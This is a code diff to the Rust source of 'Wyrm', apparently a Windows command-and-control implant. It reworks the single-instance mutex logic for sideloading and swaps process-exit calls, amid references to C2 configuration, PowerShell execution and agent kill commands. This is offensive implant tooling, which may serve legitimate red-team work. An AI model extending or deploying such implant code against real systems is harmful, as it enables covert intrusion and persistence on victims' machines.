@@ -2,8 +2,7 @@
 //! on the implant.
 
 use std::{
-    collections::VecDeque, ffi::c_void, path::PathBuf, process::exit, ptr::null_mut,
-    sync::atomic::Ordering,
+    collections::VecDeque, ffi::c_void, path::PathBuf, ptr::null_mut, sync::atomic::Ordering,
 };
 
 use rand::{
@@ -24,13 +23,13 @@ use windows_sys::{
         Storage::FileSystem::GetVolumeInformationW,
         System::{
             ProcessStatus::GetModuleFileNameExW,
-            Threading::{CreateMutexA, GetCurrentProcess, GetCurrentProcessId},
+            Threading::{
+                CreateMutexA, ExitProcess, ExitThread, GetCurrentProcess, GetCurrentProcessId,
+            },
             WindowsProgramming::{GetComputerNameW, GetUserNameW, MAX_COMPUTERNAME_LENGTH},
         },
-        UI::WindowsAndMessaging::{MB_OK, MessageBoxA},
     },
     core::{PCWSTR, PWSTR},
-    s,
 };
 
 use crate::{
@@ -50,10 +49,8 @@ use crate::{
         shell::run_powershell,
     },
     utils::{
-        comptime::translate_build_artifacts,
-        proxy::{ProxyConfig, resolve_web_proxy},
-        svc_controls::stop_svc_and_exit,
-        time_utils::epoch_now,
+        comptime::translate_build_artifacts, proxy::resolve_web_proxy,
+        strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
     },
 };
 
@@ -107,6 +104,12 @@ impl Wyrm {
             mutex,
         ) = translate_build_artifacts();
 
+        let mutex = match WyrmMutex::new(&mutex) {
+            Some(m) => m,
+            // TODO is this safe in all circumstances for sideloading?
+            None => unsafe { ExitThread(0) },
+        };
+
         Self {
             implant_id: build_implant_id(),
             c2_config: C2Config {
@@ -134,7 +137,7 @@ impl Wyrm {
                 num_retries: 3,
             },
             agent_name_by_operator,
-            mutex: WyrmMutex::new(&mutex),
+            mutex,
         }
     }
 
@@ -173,7 +176,7 @@ impl Wyrm {
                 stop_svc_and_exit()
             }
 
-            std::process::exit(0);
+            unsafe { ExitProcess(0) };
         }
 
         //
@@ -219,7 +222,7 @@ impl Wyrm {
                 Command::KillAgent => {
                     // TODO handle KA for thread vs process exit here..
                     APPLICATION_RUNNING.store(false, core::sync::atomic::Ordering::SeqCst);
-                    std::process::exit(0);
+                    unsafe { ExitProcess(0) };
                 }
                 Command::Ls => {
                     let res = dir_listing(&self.current_working_directory);
@@ -601,20 +604,23 @@ struct WyrmMutex {
 }
 
 impl WyrmMutex {
-    /// Constructs a new [`WyrmMutex`] setting the inner handle if we were successful. This function will
-    /// exit the application if the mutex is already registered.
-    fn new(mtx_name: &str) -> Self {
+    /// Constructs a new [`WyrmMutex`] setting the inner handle if we were successful.
+    ///
+    /// # Returns
+    /// - If the mutex was already set the function will return `None`
+    /// - If the user has not specified a mutex, the function will return `Some(null)`
+    /// - If the user HAS specified a mutex, and the mutex was created successfully, it will return `Some(handle)`
+    ///
+    /// The implication being; a FAIL path will be `None`.
+    fn new(mtx_name: &str) -> Option<Self> {
         if mtx_name.is_empty() {
-            return Self { handle: null_mut() };
+            return Some(Self { handle: null_mut() });
         }
 
         // Start off setting this explicitly to null, we can then add a value to it if we successfully create the
         // mutex.
 
-        let mut mtx_name = format!("Global\\{mtx_name}\0");
-        if mtx_name.len() >= MAX_PATH as usize {
-            mtx_name = mtx_name[0..MAX_PATH as usize].to_string();
-        }
+        let mut mtx_name = generate_mutex_name(mtx_name);
 
         let handle = unsafe { CreateMutexA(null_mut(), FALSE, mtx_name.as_ptr() as *const u8) };
         let last_error = unsafe { GetLastError() };
@@ -631,7 +637,7 @@ impl WyrmMutex {
                 print_failed("Mutex already exists");
             }
 
-            exit(0);
+            return None;
         }
 
         // Error check
@@ -643,16 +649,22 @@ impl WyrmMutex {
                 ));
             }
 
-            return wyrm_mutex;
+            return Some(wyrm_mutex);
         }
 
         #[cfg(debug_assertions)]
         {
+            use std::ffi::CStr;
+
             use shared::pretty_print::print_success;
-            print_success(format!("Mutex {mtx_name} registered."));
+            let s = match CStr::from_bytes_until_nul(&mtx_name) {
+                Ok(s) => s,
+                Err(_) => unsafe { CStr::from_ptr("Could not parse\0".as_ptr() as _) },
+            };
+            print_success(format!("Mutex {:?} registered.", s));
         }
 
-        wyrm_mutex
+        Some(wyrm_mutex)
     }
 }
 
